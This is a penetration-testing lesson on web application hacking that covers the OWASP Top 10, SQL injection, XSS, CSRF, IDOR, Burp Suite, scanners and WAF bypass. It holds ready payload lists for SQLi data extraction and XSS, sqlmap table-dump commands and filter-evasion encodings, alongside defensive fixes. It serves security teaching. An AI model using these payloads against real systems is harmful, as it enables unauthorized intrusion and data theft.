# Web Application Hacking

**Previous**: [04. Vulnerability Assessment](./04_Vulnerability_Assessment.md) | **Next**: [06. Authentication Attacks](./06_Authentication_Attacks.md)

---

Web applications are the most common attack surface in modern organizations. This lesson provides a deep dive into the OWASP Top 10 vulnerabilities, covering SQL injection, Cross-Site Scripting (XSS), Cross-Site Request Forgery (CSRF), and other critical web application flaws from an attacker's perspective.

> **IMPORTANT**: All techniques described in this lesson must only be used against systems you own or have explicit written authorization to test. Unauthorized access is a criminal offense.

**Difficulty**: ⭐⭐⭐

## Learning Objectives

After completing this lesson, you will be able to:

1. Identify and exploit all OWASP Top 10 vulnerability classes
2. Perform SQL injection from detection through data extraction
3. Execute reflected, stored, and DOM-based XSS attacks
4. Craft CSRF exploits and understand token-based defenses
5. Discover and exploit IDOR vulnerabilities
6. Use Burp Suite for systematic web application testing
7. Automate web vulnerability scanning with custom scripts
8. Bypass web application firewalls using encoding and obfuscation

---

## Table of Contents

1. [OWASP Top 10 (2021) Deep Dive](#1-owasp-top-10-2021-deep-dive)
2. [SQL Injection Techniques](#2-sql-injection-techniques)
3. [Cross-Site Scripting (XSS)](#3-cross-site-scripting-xss)
4. [Cross-Site Request Forgery (CSRF)](#4-cross-site-request-forgery-csrf)
5. [Insecure Direct Object References (IDOR)](#5-insecure-direct-object-references-idor)
6. [Burp Suite Methodology](#6-burp-suite-methodology)
7. [Automated Web Scanning](#7-automated-web-scanning)
8. [WAF Bypass Techniques](#8-waf-bypass-techniques)
9. [API Security Testing](#9-api-security-testing)
10. [Web Exploitation Reporting](#10-web-exploitation-reporting)
11. [Exercises](#11-exercises)
12. [Summary](#12-summary)
13. [References](#13-references)

---

## 1. OWASP Top 10 (2021) Deep Dive

The OWASP Top 10 represents the most critical web application security risks:

| Rank | Category | Description |
|------|----------|-------------|
| A01 | Broken Access Control | Authorization failures allowing unauthorized actions |
| A02 | Cryptographic Failures | Weak crypto exposing sensitive data |
| A03 | Injection | SQL, NoSQL, OS, LDAP injection |
| A04 | Insecure Design | Missing security controls in design phase |
| A05 | Security Misconfiguration | Default configs, open cloud storage |
| A06 | Vulnerable Components | Using components with known vulnerabilities |
| A07 | Authentication Failures | Broken authentication and session management |
| A08 | Software/Data Integrity | Insecure CI/CD, unsigned updates |
| A09 | Logging Failures | Insufficient logging and monitoring |
| A10 | SSRF | Server-Side Request Forgery |

---

## 2. SQL Injection Techniques

### 2.1 SQL Injection Types

**Union-based SQLi**: Uses UNION SELECT to extract data from other tables.

**Error-based SQLi**: Exploits database error messages to extract data.

**Blind SQLi (Boolean)**: Infers data based on true/false responses.

**Blind SQLi (Time-based)**: Infers data based on response time delays.

**Out-of-band SQLi**: Exfiltrates data through DNS or HTTP requests.

### 2.2 Detection and Exploitation

```python
"""
SQL Injection testing framework for authorized web app assessments.

Demonstrates SQLi detection and exploitation techniques
used in penetration testing. ONLY use against authorized targets.
"""

import re
from dataclasses import dataclass, field
from typing import Optional
from urllib.parse import quote


@dataclass
class SQLiPayload:
    """A SQL injection test payload."""
    name: str
    payload: str
    technique: str
    description: str
    detection_pattern: str = ""


@dataclass
class SQLiResult:
    """Result of a SQL injection test."""
    url: str
    parameter: str
    payload: SQLiPayload
    vulnerable: bool
    evidence: str = ""
    database_type: str = ""


# Common SQLi detection payloads
DETECTION_PAYLOADS = [
    SQLiPayload(
        name="single_quote",
        payload="'",
        technique="error-based",
        description="Basic quote to trigger SQL syntax error",
        detection_pattern=r"(SQL syntax|mysql_fetch|ORA-\d+|PG::Error)",
    ),
    SQLiPayload(
        name="boolean_true",
        payload="' OR '1'='1",
        technique="boolean-blind",
        description="Always-true condition for authentication bypass",
    ),
    SQLiPayload(
        name="boolean_false",
        payload="' OR '1'='2",
        technique="boolean-blind",
        description="Always-false condition for comparison",
    ),
    SQLiPayload(
        name="time_delay",
        payload="'; WAITFOR DELAY '0:0:5'--",
        technique="time-blind",
        description="MSSQL time-based blind injection",
    ),
    SQLiPayload(
        name="time_delay_mysql",
        payload="' OR SLEEP(5)--",
        technique="time-blind",
        description="MySQL time-based blind injection",
    ),
    SQLiPayload(
        name="union_columns",
        payload="' UNION SELECT NULL--",
        technique="union",
        description="Union injection — determine column count",
    ),
    SQLiPayload(
        name="stacked_query",
        payload="'; SELECT 1--",
        technique="stacked",
        description="Stacked query injection test",
    ),
]


# Union-based extraction payloads
EXTRACTION_PAYLOADS = {
    "mysql": {
        "version": "' UNION SELECT version()--",
        "databases": "' UNION SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata--",
        "tables": "' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='{db}'--",
        "columns": "' UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='{table}'--",
        "data": "' UNION SELECT GROUP_CONCAT({columns}) FROM {table}--",
    },
    "postgresql": {
        "version": "' UNION SELECT version()--",
        "databases": "' UNION SELECT string_agg(datname,',') FROM pg_database--",
        "tables": "' UNION SELECT string_agg(tablename,',') FROM pg_tables WHERE schemaname='public'--",
    },
}


def generate_sqli_report(results: list[SQLiResult]) -> str:
    """Generate a SQLi assessment report."""
    vulnerable = [r for r in results if r.vulnerable]
    lines = [
        "SQL Injection Assessment Report",
        "=" * 60,
        f"Total tests: {len(results)}",
        f"Vulnerable parameters: {len(vulnerable)}",
        "",
    ]
    for r in vulnerable:
        lines.append(f"\n[VULNERABLE] {r.url}")
        lines.append(f"  Parameter: {r.parameter}")
        lines.append(f"  Technique: {r.payload.technique}")
        lines.append(f"  Payload: {r.payload.payload}")
        if r.database_type:
            lines.append(f"  Database: {r.database_type}")
        if r.evidence:
            lines.append(f"  Evidence: {r.evidence[:200]}")
    return "\n".join(lines)


# Defensive: parameterized query examples
SAFE_QUERY_EXAMPLES = {
    "python_sqlite": '''
# VULNERABLE:
cursor.execute(f"SELECT * FROM users WHERE name = '{user_input}'")

# SAFE — parameterized query:
cursor.execute("SELECT * FROM users WHERE name = ?", (user_input,))
''',
    "python_psycopg2": '''
# VULNERABLE:
cursor.execute(f"SELECT * FROM users WHERE name = '{user_input}'")

# SAFE — parameterized query:
cursor.execute("SELECT * FROM users WHERE name = %s", (user_input,))
''',
    "sqlalchemy": '''
# VULNERABLE:
db.execute(text(f"SELECT * FROM users WHERE name = '{user_input}'"))

# SAFE — bound parameter:
db.execute(text("SELECT * FROM users WHERE name = :name"), {"name": user_input})
''',
}


if __name__ == "__main__":
    print("SQL Injection Testing Framework")
    print("=" * 50)
    print(f"Detection payloads: {len(DETECTION_PAYLOADS)}")
    for p in DETECTION_PAYLOADS:
        print(f"  [{p.technique:15s}] {p.name}: {p.payload}")
    print("\nSafe query patterns:")
    for lib, code in SAFE_QUERY_EXAMPLES.items():
        print(f"\n  --- {lib} ---{code}")
```

---

## 3. Cross-Site Scripting (XSS)

### 3.1 XSS Types

**Reflected XSS**: Payload is reflected from the request into the response.

**Stored XSS**: Payload is stored on the server and served to all users.

**DOM-based XSS**: Payload manipulates the DOM in the client's browser.

### 3.2 XSS Payloads and Context

```python
"""
XSS payload generator for different injection contexts.

Generates context-appropriate XSS payloads for authorized
web application testing.
"""

from dataclasses import dataclass
from enum import Enum


class XSSContext(Enum):
    """HTML context where input is reflected."""
    HTML_BODY = "Inside HTML body tags"
    HTML_ATTRIBUTE = "Inside an HTML attribute"
    JAVASCRIPT = "Inside a JavaScript block"
    URL = "Inside a URL parameter"
    CSS = "Inside CSS styles"
    HTML_COMMENT = "Inside an HTML comment"


@dataclass
class XSSPayload:
    """An XSS test payload for a specific context."""
    context: XSSContext
    payload: str
    description: str
    bypass_target: str = ""  # What WAF/filter it bypasses


XSS_PAYLOADS = {
    XSSContext.HTML_BODY: [
        XSSPayload(XSSContext.HTML_BODY,
                  '<script>alert(document.domain)</script>',
                  "Basic script injection"),
        XSSPayload(XSSContext.HTML_BODY,
                  '<img src=x onerror=alert(document.domain)>',
                  "Event handler injection"),
        XSSPayload(XSSContext.HTML_BODY,
                  '<svg onload=alert(document.domain)>',
                  "SVG event handler"),
        XSSPayload(XSSContext.HTML_BODY,
                  '<details open ontoggle=alert(document.domain)>',
                  "Details element event"),
    ],
    XSSContext.HTML_ATTRIBUTE: [
        XSSPayload(XSSContext.HTML_ATTRIBUTE,
                  '" onmouseover="alert(document.domain)',
                  "Break out of attribute with event"),
        XSSPayload(XSSContext.HTML_ATTRIBUTE,
                  "' onfocus='alert(document.domain)' autofocus='",
                  "Autofocus event trigger"),
        XSSPayload(XSSContext.HTML_ATTRIBUTE,
                  '"><script>alert(document.domain)</script>',
                  "Break out of tag entirely"),
    ],
    XSSContext.JAVASCRIPT: [
        XSSPayload(XSSContext.JAVASCRIPT,
                  "';alert(document.domain);//",
                  "Break out of JS string (single quote)"),
        XSSPayload(XSSContext.JAVASCRIPT,
                  '";alert(document.domain);//',
                  "Break out of JS string (double quote)"),
        XSSPayload(XSSContext.JAVASCRIPT,
                  '</script><script>alert(document.domain)</script>',
                  "Close script tag and inject new one"),
    ],
}


def generate_payload_list(context: XSSContext) -> list[str]:
    """Get all payloads for a specific context."""
    return [p.payload for p in XSS_PAYLOADS.get(context, [])]


# Defense: encoding functions
def html_encode(text: str) -> str:
    """Encode special characters to prevent HTML injection."""
    replacements = {
        "&": "&amp;",
        "<": "&lt;",
        ">": "&gt;",
        '"': "&quot;",
        "'": "&#x27;",
    }
    for char, entity in replacements.items():
        text = text.replace(char, entity)
    return text


if __name__ == "__main__":
    print("XSS Payload Generator")
    print("=" * 50)
    for ctx, payloads in XSS_PAYLOADS.items():
        print(f"\n--- {ctx.value} ---")
        for p in payloads:
            print(f"  {p.description}")
            print(f"  Payload: {p.payload}")
```

---

## 4. Cross-Site Request Forgery (CSRF)

CSRF forces an authenticated user to execute unwanted actions by exploiting the browser's automatic cookie inclusion.

### 4.1 CSRF Attack Flow

```
1. Victim logs into bank.com (session cookie set)
2. Victim visits attacker's page (evil.com)
3. evil.com contains hidden form that POSTs to bank.com/transfer
4. Browser automatically includes bank.com cookies
5. Transfer executes with victim's session
```

### 4.2 CSRF Defenses

- **CSRF tokens**: Unique per-session/per-request tokens in forms
- **SameSite cookies**: `SameSite=Strict` or `SameSite=Lax`
- **Origin/Referer checking**: Validate request origin headers
- **Custom headers**: Require custom headers (X-CSRF-Token)

---

## 5. Insecure Direct Object References (IDOR)

IDOR occurs when an application exposes internal object references (database IDs, file paths) and fails to verify authorization.

```python
"""
IDOR testing module for authorized web application assessments.

Tests for insecure direct object reference vulnerabilities
by manipulating resource identifiers.
"""

from dataclasses import dataclass, field
from typing import Optional


@dataclass
class IDORTest:
    """An IDOR test case."""
    endpoint: str
    parameter: str
    original_value: str
    test_values: list[str]
    method: str = "GET"
    description: str = ""


@dataclass
class IDORFinding:
    """A confirmed IDOR vulnerability."""
    endpoint: str
    parameter: str
    original_value: str
    accessed_value: str
    data_exposed: str
    severity: str = "High"


def generate_idor_tests(endpoint: str, param: str, current_id: str) -> list[IDORTest]:
    """Generate IDOR test cases for a numeric ID parameter."""
    tests = []
    if current_id.isdigit():
        cid = int(current_id)
        test_vals = [
            str(cid - 1), str(cid + 1), str(cid + 100),
            "0", "1", "-1", str(cid * 2),
        ]
        tests.append(IDORTest(
            endpoint=endpoint, parameter=param,
            original_value=current_id,
            test_values=test_vals,
            description="Numeric ID enumeration",
        ))
    return tests


if __name__ == "__main__":
    print("IDOR Testing Module")
    print("=" * 40)
    tests = generate_idor_tests("/api/users/{id}/profile", "id", "42")
    for t in tests:
        print(f"Endpoint: {t.endpoint}")
        print(f"Test values: {t.test_values}")
```

---

## 6. Burp Suite Methodology

### 6.1 Systematic Testing Workflow

```
1. Configure browser proxy → Burp (127.0.0.1:8080)
2. Spider/crawl the application (Target > Site Map)
3. Review site map for interesting endpoints
4. Send requests to Repeater for manual testing
5. Use Intruder for automated fuzzing
6. Run Scanner for automated vulnerability detection
7. Check results and validate findings
```

### 6.2 Key Burp Extensions

| Extension | Purpose |
|-----------|---------|
| Autorize | Authorization testing |
| JWT Editor | JWT manipulation |
| Param Miner | Hidden parameter discovery |
| Turbo Intruder | High-speed fuzzing |
| Logger++ | Enhanced logging |
| Collaborator Everywhere | Out-of-band detection |

---

## 7. Automated Web Scanning

```bash
# Nikto — web server scanner
nikto -h http://target:8080

# SQLMap — automated SQL injection
sqlmap -u "http://target/page?id=1" --batch --dbs
sqlmap -u "http://target/page?id=1" -D dbname --tables
sqlmap -u "http://target/page?id=1" -D dbname -T users --dump

# ffuf — web fuzzing
ffuf -u http://target/FUZZ -w /usr/share/wordlists/dirb/common.txt
ffuf -u http://target/api/FUZZ -w api-wordlist.txt -mc 200,301

# wfuzz — web fuzzer
wfuzz -c -z file,wordlist.txt http://target/FUZZ
```

---

## 8. WAF Bypass Techniques

### 8.1 Encoding Bypasses

| Technique | Example | Bypasses |
|-----------|---------|----------|
| URL encoding | `%3Cscript%3E` | Basic keyword filters |
| Double encoding | `%253Cscript%253E` | Single-decode filters |
| Unicode encoding | `\u003cscript\u003e` | ASCII-only filters |
| HTML entities | `&#60;script&#62;` | Tag filters |
| Case variation | `<ScRiPt>` | Case-sensitive filters |
| Null bytes | `%00<script>` | Length-check filters |

---

## 9. API Security Testing

### 9.1 REST API Testing Checklist

- Authentication bypass (missing auth on endpoints)
- Authorization (IDOR, privilege escalation)
- Input validation (injection in JSON parameters)
- Rate limiting (brute-force and abuse)
- Mass assignment (unexpected parameter acceptance)
- Verbose error messages (stack traces, internal paths)

---

## 10. Web Exploitation Reporting

Each web vulnerability finding should include:

- **Title**: "Stored XSS in Comment Field"
- **Severity**: CVSS score and rating
- **URL**: Exact endpoint affected
- **Parameter**: Vulnerable input field
- **Payload**: Working proof-of-concept
- **Steps to Reproduce**: Numbered steps anyone can follow
- **Impact**: What an attacker could achieve
- **Remediation**: Specific code-level fix

---

## 11. Exercises

1. **SQLi Lab**: Set up DVWA and exploit SQL injection at all security levels (low, medium, high). Document the difference in filters at each level.

2. **XSS Challenge**: Find and exploit reflected, stored, and DOM-based XSS in OWASP WebGoat. Write payloads for each context.

3. **CSRF PoC**: Create a CSRF proof-of-concept HTML page that exploits a form without CSRF protection. Then implement and test CSRF token defense.

4. **IDOR Hunt**: Test a deliberately vulnerable API for IDOR vulnerabilities. Document each finding with evidence.

5. **WAF Bypass**: Given a WAF that blocks `<script>` and `alert`, craft 5 alternative XSS payloads that bypass the filter.

6. **Full Assessment**: Perform a complete web application assessment against a practice target. Write a professional report.

---

## 12. Summary

Web application hacking targets the most exposed attack surface in modern organizations:

- **OWASP Top 10** provides the framework for systematic web testing
- **SQL injection** remains critical — from detection through full data extraction
- **XSS** attacks the trust between users and applications
- **CSRF** exploits automatic cookie inclusion for unauthorized actions
- **IDOR** bypasses authorization through predictable resource identifiers
- **Burp Suite** is the essential tool for professional web testing
- **WAF bypasses** demonstrate why defense-in-depth is necessary

---

## 13. References

- OWASP Top 10 (2021): https://owasp.org/Top10/
- PortSwigger Web Security Academy: https://portswigger.net/web-security
- OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/
- SQLMap: https://sqlmap.org/
- HackTricks Web: https://book.hacktricks.xyz/pentesting-web/
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings
